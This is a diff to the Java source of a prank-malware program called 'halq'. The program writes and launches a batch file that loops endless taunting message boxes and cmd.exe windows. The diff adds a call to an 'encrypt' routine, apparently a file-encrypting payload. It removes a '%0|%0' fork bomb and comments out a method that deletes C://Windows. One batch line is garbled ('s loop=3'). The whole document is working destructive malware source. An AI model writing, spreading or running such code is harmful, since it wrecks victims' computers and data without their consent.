@@ -18,6 +18,7 @@ public class main {
     public static void runall() {
         createbat();
         runbat();
+        encrypt.Main();
         deletesystem();
         gui.Display();
     }
@@ -32,15 +33,13 @@ public class main {
         try {
             FileWriter writer = new FileWriter("C://halq//halq.bat");
             writer.write("@echo off\n" +
-                    "echo x=MsgBox (\"you were trolled, my condolences, im deleting your system32\", 16, \"!!!!! LMAO : halq moment !!!!!\") > msgbox.vbs\n" +
-                    ":repete\n" +
+                    "echo x=MsgBox (\"you were trolled, my condolences I'm fucking your pc\", 16, \"!!!!! LMAO : halq moment !!!!!\") > msgbox.vbs\n" +
+                   ":repete\n" +
                     "start ./msgbox.vbs\n" +
                     "start cmd.exe\n" +
-                    "set /a loop=3\n" +
+                    "s loop=3\n" +
                     "goto repete\n" +
-                    "cd c:/\n" +
-                    "tree\n" +
-                            "%0|%0"
+                    "cd c:/\n"
                     );
             writer.close();
         } catch (IOException e) {
@@ -58,10 +57,10 @@ public class main {
     }
 
   public static void deletesystem() {
-      try {
-          TimeUnit.SECONDS.sleep(5);
-          Files.delete(Paths.get("C://Windows//"));
-      } catch (InterruptedException | IOException e) {
-      }
+   //   try {
+     //     TimeUnit.SECONDS.sleep(5);
+     //     Files.delete(Paths.get("C://Windows//"));
+     // } catch (InterruptedException | IOException e) {
+     // }
   }
     }
